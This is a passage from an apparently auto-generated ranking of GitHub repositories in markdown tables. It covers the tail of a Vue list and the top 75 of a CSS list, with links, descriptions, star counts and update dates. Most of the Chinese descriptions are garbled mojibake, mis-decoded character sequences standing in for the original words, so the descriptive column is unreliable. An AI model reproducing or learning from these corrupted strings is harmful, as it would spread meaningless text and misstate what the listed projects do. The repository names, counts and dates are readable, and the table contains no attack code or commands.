|172|[zhoutaoo/SpringCloud-Admin](https://github.com/zhoutaoo/SpringCloud-Admin)|ÂæÆÊúçÂä°ÂêéÂè∞ÈÄöÁî®ÁÆ°ÁêÜÁ≥ªÁªü|206|Vue|09/04|
|173|[febsteam/FEBS-Cloud-Web](https://github.com/febsteam/FEBS-Cloud-Web)|FEBS Cloud ÂæÆÊúçÂä°ÊùÉÈôêÁ≥ªÁªüÂâçÁ´ØÔºå‰ΩøÁî® vue-element-admin ÊûÑÂª∫|206|Vue|06/12|
|174|[ifzc/Shkjem](https://github.com/ifzc/Shkjem)|Âü∫‰∫éVue&ElementUIÁöÑ‰ºÅ‰∏öÂÆòÁΩë|205|Vue|09/07|
|175|[caiya/vue-neditor-wrap](https://github.com/caiya/vue-neditor-wrap)|Âü∫‰∫évueÂíåneditorÁöÑÂèåÂêëÁªëÂÆöÁªÑ‰ª∂Ôºå‰ΩøÁî®vue-cli3ÁöÑÈ°πÁõÆÂèØ‰ª•Áõ¥Êé•‰ΩøÁî®|203|Vue|07/16|
|176|[Liugq5713/vue-element-nocode-admin](https://github.com/Liugq5713/vue-element-nocode-admin)|element-ui ÁöÑ‰ª£Á†ÅÂèØËßÜÂåñÁºñËæë|203|Vue|09/08|
|177|[Zealon159/book-ms-ui](https://github.com/Zealon159/book-ms-ui)|:beers:  Âü∫‰∫é vue.js „ÄÅelement-ui Êê≠Âª∫‰∏Ä‰∏™ÊûÅÁÆÄÁöÑÂâçÂêéÁ´ØÂàÜÁ¶ªÂõæ‰π¶ÁÆ°ÁêÜÂπ≥Âè∞|200|Vue|05/22|
|178|[YTU94/meedu-wxapp](https://github.com/YTU94/meedu-wxapp)|üìúmeEduÂæÆ‰ø°Â∞èÁ®ãÂ∫è„ÄÇÔºàwxapp for meeduÔºâ|199|Vue|09/08|
|179|[CyberFei/puzzle](https://github.com/CyberFei/puzzle)|A pluggable micro-frontend structure based on Vue and Webpack4. Âü∫‰∫é Vue Âíå Webpack4 ÁöÑÂèØÁÉ≠ÊèíÊãîÂºèÂæÆÂâçÁ´ØÊû∂ÊûÑ|195|Vue|09/23|
|180|[shiguanghuxian/etcd-manage](https://github.com/shiguanghuxian/etcd-manage)|‰∏Ä‰∏™Áé∞‰ª£ÁöÑetcd v3ÁÆ°ÁêÜui|195|Vue|09/04|
|181|[xjh22222228/vue-cnode](https://github.com/xjh22222228/vue-cnode)|üöÄ Âü∫‰∫évue3 function-based ÊûÑÂª∫cnodeÁ§æÂå∫|194|Vue|09/05|
|182|[yunfeihuang/vx-ui](https://github.com/yunfeihuang/vx-ui)|vue components ÁßªÂä®Á´ØUIÁªÑ‰ª∂Â∫ì|193|Vue|09/15|
|183|[Alvin-Liu/h5editor](https://github.com/Alvin-Liu/h5editor)|‰ªøÊòì‰ºÅÁßÄÁ±ªh5È°µÈù¢ÁºñËæëÂ∑•ÂÖ∑Ôºà‰∏çÂÜçÁª¥Êä§Ôºâ|190|Vue|09/08|
|184|[fuyi501/web-video-live](https://github.com/fuyi501/web-video-live)|ÁΩëÈ°µH5Êí≠ÊîæËßÜÈ¢ëÊµÅ/Áõ¥Êí≠Á≥ªÁªüÔºå‰ΩøÁî® flv.jsÔºåvue-video-playerÊí≠ÊîæÂô®ÔºåÊµãËØïÊîØÊåÅ rtmpÔºåhttp-flvÔºåhls ËßÜÈ¢ëÊµÅÊ†ºÂºèÔºåÂèØ‰ª•ÂÅöËßÜÈ¢ëÁõëÊéßÔºå‰πüÂèØ‰ª•ÈÄöËøáËßÜÈ¢ëÊà™Âõæ„ÄÇ|188|Vue|09/09|
|185|[lx544690189/vue-mobile-calendar](https://github.com/lx544690189/vue-mobile-calendar)|a vue component of calendar for mobileÁßªÂä®Á´ØvueÊó•ÊúüÈÄâÊã©ÁªÑ‰ª∂|187|Vue|09/08|
|186|[amazingTest/Taisite-Platform](https://github.com/amazingTest/Taisite-Platform)|ÊúÄÂº∫Êé•Âè£ÊµãËØïÂπ≥Âè∞|185|Vue|09/26|
|187|[lhz960904/movie-trailer](https://github.com/lhz960904/movie-trailer)|:popcorn:Vue3 + TypeScriptÂºÄÂèëÁöÑÁîµÂΩ±È¢ÑÂëäÁâáwebAPPÔºåÂèØ‰ª•Êü•ÁúãÊ≠£Âú®ÁÉ≠Êò†‰∏éÂç≥Â∞Ü‰∏äÊò†ÁöÑÁîµÂΩ±‰ø°ÊÅØÂíåÁü≠Áâá|184|Vue|08/19|
|188|[hellowuxin/mindmap](https://github.com/hellowuxin/mindmap)|ÊÄùÁª¥ÂØºÂõæVueÁªÑ‰ª∂ - mindmap: vue component|182|Vue|08/14|
|189|[chenquincy/vue-dynamic-form-component](https://github.com/chenquincy/vue-dynamic-form-component)|Vue dynamic nested form component, support nested Object/Hashmap/Array. VueÂä®ÊÄÅÂ§öÁ∫ßË°®ÂçïÁªÑ‰ª∂ÔºåÊîØÊåÅÂµåÂ•óÂØπË±°/Hashmap/Êï∞ÁªÑ„ÄÇ|180|Vue|10/20|
|190|[hanjiangxueying/vue2-iview2-admin](https://github.com/hanjiangxueying/vue2-iview2-admin)|Âü∫‰∫évue2Âíåiview2ÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü|180|Vue|08/03|
|191|[CBDxin/VueSocial](https://github.com/CBDxin/VueSocial)|something like QQ„ÄÅweibo„ÄÅweChatÔºàvue+express+socket.io‰ªøÂæÆÂçö„ÄÅÂæÆ‰ø°ÁöÑËÅäÂ§©Á§æ‰∫§Âπ≥Âè∞Ôºâ|179|Vue|09/07|
|192|[hbteam/weex-droplet-ui](https://github.com/hbteam/weex-droplet-ui)|Ê∞¥Êª¥UI‰∏Ä‰∏™ËΩªÈáèÁ∫ßweex UIÁªÑ‰ª∂Â∫ìÔºåÂåÖÂê´Ë°®ÂçïÂÖÉÁ¥†ÔºåtabbarÔºåpickerÂüéÂ∏Ç‰∏âÁ∫ßËÅîÂä®ÈÄâÊã©ÔºåactionsheetÔºåswitchÁ≠â‰∏ÄÁ≥ªÂàóÂ∏∏Áî®ÁªÑ‰ª∂|177|Vue|04/16|
|193|[GitHubGanKai/vue3-jd-h5](https://github.com/GitHubGanKai/vue3-jd-h5)|:fire: Âü∫‰∫évue2.6+ Ôºåvue3.0.0-beta.1Ôºåvue3, vue-cli3ÔºåmockjsÔºå‰ªø‰∫¨‰∏úÊ∑òÂÆùÁöÑÔºåÁßªÂä®Á´ØH5ÁîµÂïÜÂπ≥Âè∞ÔºÅ|177|Vue|10/25|
|194|[qianduanzhou/cloudmusic](https://github.com/qianduanzhou/cloudmusic)|vue+electron+nodeÁöÑÈ´ò‰ªøÁΩëÊòì‰∫ëÊ°åÈù¢Á´ØÂ∫îÁî®|176|Vue|09/08|
|195|[wensiyuanseven/light-virtual-list](https://github.com/wensiyuanseven/light-virtual-list)|‰∏ìÊ≥®‰∫éÁÄëÂ∏ÉÊµÅ,Êï¥Â±èÊªëÂä®ÁöÑËôöÊãüÂåñÂàóË°®VueÁªÑ‰ª∂Â∫ì|174|Vue|09/02|
|196|[dnyz520/careyshop-admin](https://github.com/dnyz520/careyshop-admin)|Âü∫‰∫éThinkPHP5ÂíåVueÁöÑÈ´òÊÄßËÉΩÂâçÂêéÁ´ØÂàÜÁ¶ªÂïÜÂüéÂêéÂè∞ÁÆ°ÁêÜÊ°ÜÊû∂Á≥ªÁªü|173|Vue|10/24|
|197|[MPComponent/mpvue-picker](https://github.com/MPComponent/mpvue-picker)|Âü∫‰∫é mpvue Ê°ÜÊû∂ÁöÑÂ∞èÁ®ãÂ∫èÈÄâÊã©Êéß‰ª∂ÔºåÊîØÊåÅÂçïÂàóÔºåÂ§öÂàóÔºåËÅîÂä®„ÄÇ|173|Vue|10/24|
|198|[acccccccb/vue-img-cutter](https://github.com/acccccccb/vue-img-cutter)|ÁÆÄÂçïÊòìÁî®ÁöÑvueÂõæÁâáË£ÅÂâ™Êèí‰ª∂ÔºåÊîØÊåÅÁßªÂä®ÂõæÂÉèÔºåË£ÅÂâ™ÂõæÁâáÔºåÊîæÂ§ßÁº©Â∞èÂõæÁâáÔºå‰∏ä‰∏ãÂ∑¶Âè≥ÁßªÂä®ÔºåÂõ∫ÂÆöÊØî‰æãÔºåÂõ∫ÂÆöÂ∞∫ÂØ∏ÔºåËøúÁ®ãÂõæÁâáË£ÅÂâ™ÔºåÂè™ÈúÄË¶ÅÂæàÂ∞ëÁöÑ‰ª£Á†ÅÂ∞±ÂèØ‰ª•ÂÆûÁé∞Ë£ÅÂâ™ÂäüËÉΩÔºå‰πüÂèØ‰ª•ÈÄöËøáË∞ÉÊï¥ÂèÇÊï∞‰ª•ÈÄÇÂ∫î‰Ω†Ëá™Â∑±ÁöÑ‰∏öÂä°ÈúÄÊ±Ç„ÄÇ|170|Vue|10/11|
|199|[baimingxuan/vue-admin-design](https://github.com/baimingxuan/vue-admin-design)|Âü∫‰∫évue + elementUIÁöÑÁÆ°ÁêÜÁ≥ªÁªüÊ®°Êùø|170|Vue|09/23|
|200|[wannaxiao/vuepress-theme-resume](https://github.com/wannaxiao/vuepress-theme-resume)|üêà ‰π¶ÂÜôÁÆÄÊ¥Å‰ºòÈõÖÁöÑÂâçÁ´ØÁ®ãÂ∫èÂëò markdown ÁÆÄÂéÜÔºåÁî± vuepress È©±Âä®|170|Vue|05/09|

‚¨Ü [ÂõûÂà∞ÁõÆÂΩï](#ÁõÆÂΩï)

<br/>

## CSS

|#|Repository|Description|Stars|Language|Updated|
|:-|:-|:-|:-|:-|:-|
|1|[houshanren/hangzhou_house_knowledge](https://github.com/houshanren/hangzhou_house_knowledge)|2017Âπ¥‰π∞ÊàøÁªèÂéÜÊÄªÁªìÂá∫Êù•ÁöÑ‰π∞ÊàøË¥≠ÊàøÁü•ËØÜÂàÜ‰∫´ÁªôÂ§ßÂÆ∂ÔºåÂ∏åÊúõÂØπÂ§ßÂÆ∂ÊúâÊâÄÂ∏ÆÂä©„ÄÇ‰π∞Êàø‰∏çÊòìÔºå‰∏î‰π∞‰∏îÁèçÊÉú„ÄÇSharing the knowledge of buy an own house that according  to the experience at hangzhou in 2017 to all the people. It's not easy to buy a own house, so I hope that it would be useful to everyone.|24.5k|CSS|10/18|
|2|[SwiftGGTeam/the-swift-programming-language-in-chinese](https://github.com/SwiftGGTeam/the-swift-programming-language-in-chinese)|‰∏≠ÊñáÁâà Apple ÂÆòÊñπ Swift ÊïôÁ®ã„ÄäThe Swift Programming Language„Äã|19.8k|CSS|10/25|
|3|[apachecn/algo-zh](https://github.com/apachecn/algo-zh)|ÁªìÊûÑÂåñÁÆóÊ≥ïÂà∑È¢òËÆ≠ÁªÉÊåáÂçó|10.1k|CSS|10/06|
|4|[getgridea/gridea](https://github.com/getgridea/gridea)|‚úçÔ∏èA static blog writing client (‰∏Ä‰∏™ÈùôÊÄÅÂçöÂÆ¢ÂÜô‰ΩúÂÆ¢Êà∑Á´Ø)|6.5k|CSS|09/08|
|5|[deeplearning-ai/machine-learning-yearning-cn](https://github.com/deeplearning-ai/machine-learning-yearning-cn)|Machine Learning Yearning ‰∏≠ÊñáÁâà - „ÄäÊú∫Âô®Â≠¶‰π†ËÆ≠ÁªÉÁßòÁ±ç„Äã - Andrew Ng Ëëó|6.4k|CSS|04/05|
|6|[xtyxtyx/sorry](https://github.com/xtyxtyx/sorry)|Âú®Á∫øÂà∂‰Ωú`sorry ‰∏∫ÊâÄÊ¨≤‰∏∫`ÁöÑgif|6.1k|CSS|04/03|
|7|[DMQ/mvvm](https://github.com/DMQ/mvvm)|ÂâñÊûêvueÂÆûÁé∞ÂéüÁêÜÔºåËá™Â∑±Âä®ÊâãÂÆûÁé∞mvvm|4.7k|CSS|09/16|
|8|[apachecn/sklearn-doc-zh](https://github.com/apachecn/sklearn-doc-zh)|:book: [ËØë] scikit-learnÔºàsklearnÔºâ ‰∏≠ÊñáÊñáÊ°£|3.9k|CSS|10/23|
|9|[Wei-Xia/most-frequent-technology-english-words](https://github.com/Wei-Xia/most-frequent-technology-english-words)|Á®ãÂ∫èÂëòÂ∑•‰Ωú‰∏≠Â∏∏ËßÅÁöÑËã±ËØ≠ËØçÊ±á|3.4k|CSS|10/22|
|10|[LearnOpenGL-CN/LearnOpenGL-CN](https://github.com/LearnOpenGL-CN/LearnOpenGL-CN)|http://learnopengl.com Á≥ªÂàóÊïôÁ®ãÁöÑÁÆÄ‰Ωì‰∏≠ÊñáÁøªËØë|2.8k|CSS|09/12|
|11|[yscoder/hexo-theme-indigo](https://github.com/yscoder/hexo-theme-indigo)|‰∏Ä‰∏™Material DesignÈ£éÊ†ºÁöÑHexo‰∏ªÈ¢ò„ÄÇ https://imys.net/ „ÄÄ„ÄÄ Â§áÁî®:|2.7k|CSS|07/24|
|12|[apachecn/pytorch-doc-zh](https://github.com/apachecn/pytorch-doc-zh)|Pytorch ‰∏≠ÊñáÊñáÊ°£|2.7k|CSS|10/22|
|13|[ronggang/transmission-web-control](https://github.com/ronggang/transmission-web-control)|‰∏Ä‰∏™ Transmission ÊµèËßàÂô®ÁÆ°ÁêÜÁïåÈù¢„ÄÇTransmission Web Control is a custom web UI.|2.6k|CSS|10/05|
|14|[billie66/TLCL](https://github.com/billie66/TLCL)|„ÄäÂø´‰πêÁöÑ Linux ÂëΩ‰ª§Ë°å„Äã|2.5k|CSS|10/04|
|15|[LiangJunrong/document-library](https://github.com/LiangJunrong/document-library)|jsliang ÁöÑÊñáÊ°£Â∫ì. ÈáåÈù¢ÂåÖÂê´‰∫Ü‰∏™‰∫∫Êí∞ÂÜôÁöÑÊâÄÊúâÂâçÁ´ØÊñáÁ´†Ôºå‰æãÂ¶Ç Vue„ÄÅReact,„ÄÅECharts„ÄÅÂæÆ‰ø°Â∞èÁ®ãÂ∫è„ÄÅÁÆóÊ≥ï„ÄÅÊï∞ÊçÆÁªìÊûÑÁ≠â‚Ä¶‚Ä¶|2.3k|CSS|10/29|
|16|[zmrenwu/django-blog-tutorial](https://github.com/zmrenwu/django-blog-tutorial)|Âü∫‰∫é Python3.5 Âíå Django 1.10 ÁöÑ Django Blog È°πÁõÆ„ÄÇ|2.1k|CSS|06/06|
|17|[apachecn/fe4ml-zh](https://github.com/apachecn/fe4ml-zh)|:book: [ËØë] Èù¢ÂêëÊú∫Âô®Â≠¶‰π†ÁöÑÁâπÂæÅÂ∑•Á®ã|2.1k|CSS|10/06|
|18|[QiShaoXuan/css_tricks](https://github.com/QiShaoXuan/css_tricks)|Some CSS tricks,‰∏Ä‰∫õ CSS Â∏∏Áî®Ê†∑Âºè|2.1k|CSS|06/17|
|19|[WebStackPage/WebStackPage.github.io](https://github.com/WebStackPage/WebStackPage.github.io)|‚ù§Ô∏èÈùôÊÄÅÂìçÂ∫îÂºèÁΩëÂùÄÂØºËà™ÁΩëÁ´ô - webstack.cc|2.0k|CSS|09/24|
|20|[FunctionClub/V2ray.Fun](https://github.com/FunctionClub/V2ray.Fun)|Ê≠£Âú®ÂºÄÂèëÁöÑÂÖ®Êñ∞ V2ray.Fun|2.0k|CSS|10/28|
|21|[apachecn/mit-18.06-linalg-notes](https://github.com/apachecn/mit-18.06-linalg-notes)|MIT 18.06 Á∫øÊÄß‰ª£Êï∞Á¨îËÆ∞|1.5k|CSS|10/07|
|22|[wizardforcel/sicp-py-zh](https://github.com/wizardforcel/sicp-py-zh)|:book:„ÄêËØë„ÄëUCB CS61a SICP Python|1.4k|CSS|08/17|
|23|[nicejade/markdown-online-editor](https://github.com/nicejade/markdown-online-editor)|üìùÂü∫‰∫é Vue„ÄÅVditorÔºåÊâÄÊûÑÂª∫ÁöÑÂú®Á∫ø Markdown ÁºñËæëÂô®ÔºåÊîØÊåÅÊµÅÁ®ãÂõæ„ÄÅÁîòÁâπÂõæ„ÄÅÊó∂Â∫èÂõæ„ÄÅ‰ªªÂä°ÂàóË°®„ÄÅHTML Ëá™Âä®ËΩ¨Êç¢‰∏∫ Markdown Á≠âÂäüËÉΩÔºõüéâÊñ∞Â¢û„ÄåÊâÄËßÅÂç≥ÊâÄÂæó„ÄçÁºñËæëÊ®°Âºè„ÄÇ|1.2k|CSS|10/09|
|24|[apachecn/home](https://github.com/apachecn/home)|ApacheCN  ÂºÄÊ∫êÁªÑÁªáÔºöÂÖ¨Âëä„ÄÅ‰ªãÁªç„ÄÅÊàêÂëò„ÄÅÊ¥ªÂä®„ÄÅ‰∫§ÊµÅÊñπÂºè|1.2k|CSS|10/29|
|25|[abc-club/js-paradise](https://github.com/abc-club/js-paradise)|ÂâçÁ´Ø‰πêÂõ≠|1.1k|CSS|10/28|
|26|[apachecn/spark-doc-zh](https://github.com/apachecn/spark-doc-zh)|Apache Spark ÂÆòÊñπÊñáÊ°£‰∏≠ÊñáÁâà|1.1k|CSS|10/06|
|27|[beeth0ven/RxSwift-Chinese-Documentation](https://github.com/beeth0ven/RxSwift-Chinese-Documentation)|RxSwift ‰∏≠ÊñáÊñáÊ°£|1.0k|CSS|09/18|
|28|[egotong/nows](https://github.com/egotong/nows)|ÊØíÈ∏°Ê±§|1.0k|CSS|07/05|
|29|[yihui/xaringan](https://github.com/yihui/xaringan)|Presentation Ninja ÂπªÁÅØÂøçËÄÖ ¬∑ ÂÜôËΩÆÁúº|1.0k|CSS|10/26|
|30|[leopardpan/leopardpan.github.io](https://github.com/leopardpan/leopardpan.github.io)|‰∏™‰∫∫ÂçöÂÆ¢ÔºåÁúãÊïàÊûúËøõÂÖ•|1.0k|CSS|07/13|
|31|[shenliyang/hexo-theme-snippet](https://github.com/shenliyang/hexo-theme-snippet)|Snippet ÁÆÄÊ¥ÅËÄå‰∏çÁÆÄÂçïÔºå‰πüËÆ∏ÊòØ‰∏ÄÊ¨æ‰Ω†ÂØªÊâæÂ∑≤‰πÖÁöÑhexo‰∏ªÈ¢ò|968|CSS|04/07|
|32|[smartping/smartping](https://github.com/smartping/smartping)|ÁªºÂêàÊÄßÁΩëÁªúË¥®Èáè(PING)Ê£ÄÊµãÂ∑•ÂÖ∑ÔºåÊîØÊåÅÊ≠£/ÂèçÂêëPINGÁªòÂõæ„ÄÅ‰∫íPINGÊãìÊâëÁªòÂõæ‰∏éÊä•Ë≠¶„ÄÅÂÖ®ÂõΩPINGÂª∂ËøüÂú∞Âõæ‰∏éÂú®Á∫øÊ£ÄÊµãÂ∑•ÂÖ∑Á≠âÂäüËÉΩ |955|CSS|10/05|
|33|[cnfeat/GoodThingList](https://github.com/cnfeat/GoodThingList)|GoodThingList Â∞±ÊòØÂ•ΩÁâ©Ê∏ÖÂçïÔºå‰ΩøÁî®ÊñáÊ°£ËßÅ Issues|931|CSS|03/11|
|34|[w-digital-scanner/w12scan](https://github.com/w-digital-scanner/w12scan)|üöÄ A simple asset discovery engine for cybersecurity. (ÁΩëÁªúËµÑ‰∫ßÂèëÁé∞ÂºïÊìé)|895|CSS|04/26|
|35|[kaeyleo/jekyll-theme-H2O](https://github.com/kaeyleo/jekyll-theme-H2O)| üéâ A clean and delicate Jekyll theme. JekyllÂçöÂÆ¢‰∏ªÈ¢ò|882|CSS|04/18|
|36|[h5ds/h5ds](https://github.com/h5ds/h5ds)|H5DS (HTML5 Design software) ËøôÊòØ‰∏ÄÊ¨æÂü∫‰∫éWEBÁöÑ H5Âà∂‰ΩúÂ∑•ÂÖ∑„ÄÇËÆ©‰∏ç‰ºöÂÜô‰ª£Á†ÅÁöÑ‰∫∫‰πüËÉΩËΩªÊùæÂø´ÈÄü‰∏äÊâãÂà∂‰ΩúH5È°µÈù¢„ÄÇÁ±ª‰ººÊòì‰ºÅÁßÄÁöÑH5Âà∂‰Ωú„ÄÅÂª∫Á´ôÂ∑•ÂÖ∑ÔºåÁ§∫ËåÉÁΩëÁ´ôÔºöh5ds.com |879|CSS|07/09|
|37|[xuqiang521/nuxt-ssr-demo](https://github.com/xuqiang521/nuxt-ssr-demo)|:sparkles:  È´ò‰ªøÊéòÈáëÔºåÊï¥Âêà vue + nuxt + axios + vuex + vue-router (nuxt Ëá™Â∏¶ vuex Âíå vue-router)Ôºå‰∏Ä‰∏™Âü∫‰∫é Nuxt ÁöÑÊúçÂä°Âô®Á´ØÊ∏≤Êüì Demo|813|CSS|09/11|
|38|[apachecn/pyda-2e-zh](https://github.com/apachecn/pyda-2e-zh)|:book:  [ËØë] Âà©Áî® Python ËøõË°åÊï∞ÊçÆÂàÜÊûê ¬∑ Á¨¨ 2 Áâà|789|CSS|10/06|
|39|[longfeizheng/logback](https://github.com/longfeizheng/logback)|üí° SpringBoot+Spring SecurityÂü∫Êú¨ÈÖçÁΩÆ|758|CSS|06/11|
|40|[YGYOOO/WeChat-Shelter](https://github.com/YGYOOO/WeChat-Shelter)|chromeÊèí‰ª∂ÔºåÊääÁΩëÈ°µÂæÆ‰ø°‰º™Ë£ÖÊàê‰∫ëÁ¨îËÆ∞~Ôºà‰ªÖ‰æõÂ®±‰πê! (Ôø£ŒµÔø£) |707|CSS|04/30|
|41|[apachecn/lightgbm-doc-zh](https://github.com/apachecn/lightgbm-doc-zh)|LightGBM ‰∏≠ÊñáÊñáÊ°£|661|CSS|10/06|
|42|[theme-nexmoe/hexo-theme-nexmoe](https://github.com/theme-nexmoe/hexo-theme-nexmoe)|üî• ‰∏Ä‰∏™ÊØîËæÉÁâπÂà´ÁöÑ Hexo ‰∏ªÈ¢ò|647|CSS|10/25|
|43|[e282486518/yii2admin](https://github.com/e282486518/yii2admin)|ÈÄöÁî®ÁöÑyii2ÂêéÂè∞ÔºåÂü∫‰∫éYii2ÁöÑadvancedÂ∫îÁî®Á®ãÂ∫èÊ®°ÊùøÔºåÊï¥ÂêàRBAC„ÄÅMenu„ÄÅConfig„ÄÅMigrationÂ§öËØ≠Ë®Ä„ÄÅRESTfullÁ≠âÁ≠â...|613|CSS|05/25|
|44|[xiangming/landscape-plus](https://github.com/xiangming/landscape-plus)|ÈíàÂØπ‰∏≠ÂõΩÂ§ßÈôÜÂú∞Âå∫ÂØπhexoÂÆòÊñπ‰∏ªÈ¢òlandscapeËøõË°å‰ºòÂåñ„ÄÇ|502|CSS|02/20|
|45|[AlanDecode/Typecho-Theme-VOID](https://github.com/AlanDecode/Typecho-Theme-VOID)|üêí Áå¥Â≠êÊâìÂ≠óÊú∫ÂéüÁêÜÁöÑ‰∫ßÁâ©|496|CSS|07/30|
|46|[blinkfox/typora-vue-theme](https://github.com/blinkfox/typora-vue-theme)|This is a typora theme inspired by Vue document style. ‰∏Ä‰∏™Á±ª‰ºº‰∫é Vue ÊñáÊ°£È£éÊ†ºÁöÑ Typora Markdown ÁºñËæëÂô®‰∏ªÈ¢ò„ÄÇ|490|CSS|10/15|
|47|[apachecn/xgboost-doc-zh](https://github.com/apachecn/xgboost-doc-zh)|XGBoost ‰∏≠ÊñáÊñáÊ°£|485|CSS|10/06|
|48|[ownthink/robot](https://github.com/ownthink/robot)|Áü•ËØÜÂõæË∞±ÈóÆÁ≠îÊú∫Âô®‰∫∫ÔºåËÅäÂ§©Êú∫Âô®‰∫∫ÔºåÂü∫‰∫éÁü•ËØÜÂõæË∞±„ÄÅËØ≠‰πâÁêÜËß£Á≠âÁöÑÂØπËØùÊú∫Âô®‰∫∫„ÄÇ|478|CSS|10/21|
|49|[ant-mini-program/mini-antui](https://github.com/ant-mini-program/mini-antui)|mini-antui ÂÅúÊ≠¢Áª¥Êä§ÔºåÂèØ‰ΩøÁî® mini-ali-ui ÔºåÂìÅÁâåÂçáÁ∫ßÔºåÂäüËÉΩÂä†Âº∫ÔºåÊ¨¢Ëøé‰ΩøÁî®ÔºÅ|450|CSS|03/02|
|50|[v2fly/v2ray-examples](https://github.com/v2fly/v2ray-examples)|v2ray-core ÁöÑÊ®°Êùø‰ª¨|447|CSS|10/25|
|51|[byrwiki/byrwiki](https://github.com/byrwiki/byrwiki)|ÂåóÈÇÆ‰∫∫ÂØºËà™Ôºö‰∏Ä‰∏™Ê°ÜÔºåÂÖ®ËÉΩÊêú|444|CSS|06/18|
|52|[d2-projects/folder-explorer](https://github.com/d2-projects/folder-explorer)|ÂàÜÊûêÊñá‰ª∂ÁõÆÂΩïÔºåÁªüËÆ°Êï∞ÊçÆÂπ∂‰ª•Ê†ëÂΩ¢ÁªìÊûÑÂíåÂõæË°®ÁöÑÂΩ¢ÂºèÂ±ïÁ§∫ÁªìÊûúÔºå‰πüÂèØ‰ª•ÂØºÂá∫Â§öÁßçÊ†ºÂºèÁïôÂ≠ò|430|CSS|09/12|
|53|[Dreamer-Paul/Single](https://github.com/Dreamer-Paul/Single)|üéà ‰∏Ä‰∏™ÁÆÄÊ¥ÅÂ§ßÊ∞îÔºåÂê´Â§úÈó¥Ê®°ÂºèÁöÑ Typecho ÂçöÂÆ¢‰∏ªÈ¢ò|417|CSS|09/11|
|54|[fex-team/fex-team.github.io](https://github.com/fex-team/fex-team.github.io)|ÂÅöÊúÄ‰∏ì‰∏öÁöÑÂâçÁ´ØÂõ¢Èòü|397|CSS|06/19|
|55|[nodejs/nodejs-zh-CN](https://github.com/nodejs/nodejs-zh-CN)|node.js ‰∏≠ÊñáÂåñ & ‰∏≠ÊñáÁ§æÂå∫|393|CSS|07/11|
|56|[ltadpoles/web-document](https://github.com/ltadpoles/web-document)|ÂâçÁ´ØÂéÜÁ®ã|387|CSS|08/28|
|57|[xmxoxo/BERT-train2deploy](https://github.com/xmxoxo/BERT-train2deploy)|BERTÊ®°Âûã‰ªéËÆ≠ÁªÉÂà∞ÈÉ®ÁΩ≤|387|CSS|09/23|
|58|[wepyjs/wepy-weui-demo](https://github.com/wepyjs/wepy-weui-demo)|WeUI Âú® WePY ‰∏≠ÁöÑ‰ΩøÁî®Á§∫‰æãÔºåÂêå‰∏Ä‰ªΩ‰ª£Á†ÅÂèØ‰ª•ËøêË°åÂú®Â∞èÁ®ãÂ∫è‰∏äÂíåWeb‰∏ä|387|CSS|10/02|
|59|[zlq4863947/tradingViewWikiCn](https://github.com/zlq4863947/tradingViewWikiCn)|tradingViewÁöÑ‰∏≠ÊñáÂºÄÂèëÊñáÊ°£|385|CSS|10/06|
|60|[dongyuanxin/theme-bmw](https://github.com/dongyuanxin/theme-bmw)|‚úã Smart Voice: Voice for yourself   ÂæÆÂ£∞: ËØ∑‰∏∫Ëá™Â∑±ÂèëÂ£∞|375|CSS|02/19|
|61|[DT27/EditorMD](https://github.com/DT27/EditorMD)|Markdown ÁºñËæëÂô® Editor.md for Typecho|367|CSS|05/06|
|62|[zhangyingwei/html-css-only](https://github.com/zhangyingwei/html-css-only)|ÊºÇ‰∫ÆÁöÑ CSS Á≥ªÂàó~|351|CSS|07/12|
|63|[apachecn/thinking-in-java-zh](https://github.com/apachecn/thinking-in-java-zh)|:book: Java ÁºñÁ®ãÊÄùÊÉ≥|351|CSS|09/17|
|64|[apachecn/ml-mastery-zh](https://github.com/apachecn/ml-mastery-zh)|:book: [ËØë] MachineLearningMastery ÂçöÂÆ¢ÊñáÁ´†|349|CSS|10/06|
|65|[w-digital-scanner/w11scan](https://github.com/w-digital-scanner/w11scan)|ÂàÜÂ∏ÉÂºèWEBÊåáÁ∫πËØÜÂà´Âπ≥Âè∞ Distributed WEB fingerprint identification platform|341|CSS|06/06|
|66|[7dog7/bottleneckOsmosis](https://github.com/7dog7/bottleneckOsmosis)|Áì∂È¢àÊ∏óÈÄè,webÊ∏óÈÄè,redÁ∫¢Èòü,fuzz param,Ê≥®Èáä,jsÂ≠óÂÖ∏,ctf|337|CSS|09/06|
|67|[jhao104/django-blog](https://github.com/jhao104/django-blog)|djangoÊê≠Âª∫ÂçöÂÆ¢|336|CSS|10/29|
|68|[Jackwire/Jackwire.github.io](https://github.com/Jackwire/Jackwire.github.io)|ÊâòÁ¶èÈõÖÊÄùGREÂíåGMATËµÑÊñôÔºåÁî≥ËØ∑Êñá‰π¶ÈõÜÂêà„ÄÇÂ≠òÂú®ÁôæÂ∫¶ÁΩëÁõòÈáå|324|CSS|05/03|
|69|[codeset/google-java-styleguide](https://github.com/codeset/google-java-styleguide)|Google Java‰ª£Á†ÅÈ£éÊ†ºËßÑËåÉ (‰∏≠ÊñáÁâà)|320|CSS|10/13|
|70|[xupsh/pp4fpgas-cn](https://github.com/xupsh/pp4fpgas-cn)|‰∏≠ÊñáÁâà Parallel Programming for FPGAs|313|CSS|10/30|
|71|[Daotin/Web](https://github.com/Daotin/Web)|üìöüñä ÂºÄÂßãÂêßÔºåÂâçÁ´ØÔºÅ‰ªéÈõ∂ÂºÄÂßãÂ≠¶ Web ÂâçÁ´ØÁ≥ªÂàóÊïôÁ®ã„ÄÇÂâçÁ´ØÂ∞èÁôΩÈõ∂Âü∫Á°ÄËá™Â≠¶ÂÖ•Èó®ËøõÈò∂ÂõæÊñáÊïôÁ®ã„ÄÇ|280|CSS|10/15|
|72|[ustc-zzzz/YiGeDingLia](https://github.com/ustc-zzzz/YiGeDingLia)|‰∏Ä‰∏™È°∂‰ø©|269|CSS|09/10|
|73|[EastWorld/wechat-app-order](https://github.com/EastWorld/wechat-app-order)|ÁÇπÈ§êÂ∞èÁ®ãÂ∫èÔºåÁÇπÂçïËá™Âä®Âá∫ÂçïÔºåÁÇπÈ§êËá™Âä®ÊâìÂç∞|263|CSS|07/27|
|74|[nyahentai/nyahentai.github.io](https://github.com/nyahentai/nyahentai.github.io)|NyaHentaiÂñµÁ¥≥Â£´ÊúÄÊñ∞Á∂≤ÂùÄÁôºÂ∏ÉÈ†Å|263|CSS|10/27|
|75|[mengkunsoft/lmbtfy](https://github.com/mengkunsoft/lmbtfy)|üîç ËÆ©ÊàëÂ∏Æ‰Ω†ÁôæÂ∫¶‰∏Ä‰∏ãÔºüLet Me Baidu That For You|262|CSS|09/05|
